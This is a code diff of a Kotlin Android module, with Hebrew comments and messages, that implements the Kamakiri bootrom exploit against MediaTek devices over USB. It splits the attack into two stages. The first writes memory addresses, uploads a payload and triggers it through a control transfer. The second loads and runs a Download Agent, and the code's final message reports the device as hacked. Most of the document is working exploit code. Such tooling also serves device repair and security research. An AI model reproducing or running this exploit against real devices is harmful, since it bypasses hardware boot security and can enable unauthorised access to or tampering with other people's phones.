@@ -10,11 +10,11 @@ import java.util.Locale
 
 object MtkBromConnection {
 
-    fun runKamakiriAndSendDa(
+    // שלב 1: רק פריצת Kamakiri (בלי DA)
+    fun runKamakiriExploit(
         usbManager: UsbManager,
         device: UsbDevice,
         payloadBytes: ByteArray,
-        daBytes: ByteArray,
         onProgress: (String) -> Unit
     ): String {
         val connection = usbManager.openDevice(device) ?: return "שגיאה: פתיחת חיבור נכשלה."
@@ -52,7 +52,7 @@ object MtkBromConnection {
 
         fun echo(data: ByteArray) {
             usbwrite(data)
-            usbread(data.size) // just read whatever comes back, don't validate
+            usbread(data.size)
         }
 
         fun readDword(): Int {
@@ -87,69 +87,113 @@ object MtkBromConnection {
         val addr = 0x10007050
         val revdwordPayloadAddr = 0x000A1000
 
-        // 1. write32
-        onProgress("write32(0x${Integer.toHexString(addr)})...")
         write32(addr, intArrayOf(revdwordPayloadAddr))
-
-        // 2. read32 loop
-        onProgress("read32 loop...")
         for (i in 0 until 0xF) {
             read32(addr - (0xF - i) * 4, 0xF - i + 1)
         }
 
-        // 3. echo 0xE0 (no validation!)
         onProgress("echo 0xE0...")
         echo(byteArrayOf(0xE0.toByte()))
 
-        // 4. echo len(payload) as Big Endian
         onProgress("send payload length...")
         echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(payloadBytes.size).array())
 
-        // 5. check status (2 bytes) - ignore
         onProgress("check status...")
         usbread(2)
 
-        // 6. send payload
         onProgress("Sending payload...")
         usbwrite(payloadBytes)
 
-        // 7. read 2 bytes (ack?)
         onProgress("read ack...")
         usbread(2)
         usbread(2)
 
-        // 8. ctrl_transfer (request type 0xA1, request 0, value 0, index var1=0x25)
         onProgress("Triggering ctrl_transfer...")
         connection.controlTransfer(0xA1, 0, 0, 0x25, null, 0, 1000)
+        
+        connection.close()
+        onProgress("Kamakiri exploit finished. Waiting for reconnection...")
+        
+        return "SUCCESS" // Special return code for MainActivity
+    }
 
-        // --- Kamakiri done! Now sending DA ---
-        onProgress("Kamakiri done! Sending DA...")
+    // שלב 2: שליחת ה-DA (אחרי שהמכשיר התחבר מחדש)
+    fun sendDaAfterExploit(
+        usbManager: UsbManager,
+        device: UsbDevice,
+        daBytes: ByteArray,
+        onProgress: (String) -> Unit
+    ): String {
+        val connection = usbManager.openDevice(device) ?: return "שגיאה: פתיחת חיבור נכשלה."
 
-        if (!usbwrite(byteArrayOf(0xD7.toByte()))) {
-            connection.close()
-            return "Kamakiri עבד, אבל שליחת פקודת DA (0xD7) נכשלה."
+        var epIn: UsbEndpoint? = null
+        var epOut: UsbEndpoint? = null
+        for (i in 0 until device.interfaceCount) {
+            val usbInterface = device.getInterface(i)
+            if (connection.claimInterface(usbInterface, true)) {
+                for (j in 0 until usbInterface.endpointCount) {
+                    val ep = usbInterface.getEndpoint(j)
+                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
+                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep
+                        else if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
+                    }
+                }
+                if (epIn != null && epOut != null) break
+            }
         }
 
+        if (epIn == null || epOut == null) {
+            connection.close()
+            return "שגיאה: לא נמצאו נקודות קצה."
+        }
+
+        fun usbwrite(data: ByteArray): Boolean {
+            return connection.bulkTransfer(epOut, data, data.size, 2000) >= 0
+        }
+
+        fun usbread(len: Int): ByteArray {
+            val buf = ByteArray(len)
+            connection.bulkTransfer(epIn, buf, len, 2000)
+            return buf
+        }
+
+        // 1. לחיצת יד (0xA0 עבור BROM, 0xA1 עבור Preloader)
+        val isBrom = device.productId == 0x0003 || device.productId == 0x0001
+        val hsCmd = if (isBrom) 0xA0.toByte() else 0xA1.toByte()
+        
+        onProgress("Sending Handshake (0x${String.format(Locale.US, "%02X", hsCmd)})...")
+        usbwrite(byteArrayOf(hsCmd))
+        usbread(1) // Read ACK (0x5F, 0xC0)
+
+        // 2. פקודת Send DA (0xD7)
+        onProgress("Sending 0xD7...")
+        if (!usbwrite(byteArrayOf(0xD7.toByte()))) {
+            connection.close()
+            return "שגיאה: שליחת 0xD7 נכשלה."
+        }
+        
         val ack1 = usbread(1)
         if (ack1.isEmpty() || ack1[0] != 0xD8.toByte()) {
             val hex = if(ack1.isNotEmpty()) String.format(Locale.US, "0x%02X", ack1[0]) else "אין"
             connection.close()
-            return "Kamakiri עבד, אבל תגובה ל-0xD7 לא תקינה ($hex)."
+            return "שגיאה: תגובה ל-0xD7 לא תקינה ($hex)."
         }
 
+        // 3. שליחת גודל
         val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(daBytes.size).array()
         if (!usbwrite(sizeBytes)) {
             connection.close()
-            return "Kamakiri עבד, אבל שליחת גודל DA נכשלה."
+            return "שגיאה: שליחת גודל נכשלה."
         }
 
         val ack2 = usbread(1)
         if (ack2.isEmpty() || ack2[0] != 0xD9.toByte()) {
             val hex = if(ack2.isNotEmpty()) String.format(Locale.US, "0x%02X", ack2[0]) else "אין"
             connection.close()
-            return "Kamakiri עבד, אבל תגובה לגודל DA לא תקינה ($hex)."
+            return "שגיאה: תגובה לגודל לא תקינה ($hex)."
         }
 
+        // 4. שליחת נתונים
         var offset = 0
         val chunkSize = 512
         while (offset < daBytes.size) {
@@ -158,14 +202,14 @@ object MtkBromConnection {
 
             if (!usbwrite(chunk)) {
                 connection.close()
-                return "שגיאה: שליחת נתוני DA נכשלה ב-$offset."
+                return "שגיאה: שליחת נתונים נכשלה ב-$offset."
             }
 
             val ack = usbread(1)
             if (ack.isEmpty() || (ack[0] != 0x5A.toByte() && ack[0] != 0x5F.toByte())) {
                 val hex = if(ack.isNotEmpty()) String.format(Locale.US, "0x%02X", ack[0]) else "אין"
                 connection.close()
-                return "שגיאה: תגובה לא תקינה לנתוני DA ב-$offset ($hex)."
+                return "שגיאה: תגובה לא תקינה לנתונים ב-$offset ($hex)."
             }
 
             offset += length
@@ -174,15 +218,15 @@ object MtkBromConnection {
             }
         }
 
+        // 5. הרצת DA
         onProgress("Running DA...")
         if (!usbwrite(byteArrayOf(0xD5.toByte()))) {
             connection.close()
-            return "שגיאה: שליחת פקודת הרצה (0xD5) נכשלה."
+            return "שגיאה: שליחת פקודת הרצה נכשלה."
         }
 
         usbread(2)
-
         connection.close()
-        return "הצלחה מסחררת!!! Kamakiri עבד וה-DA נטען. המכשיר פרוץ!"
+        return "הצלחה מסחררת! ה-DA נטען והורץ. המכשיר פרוץ!"
     }
 }
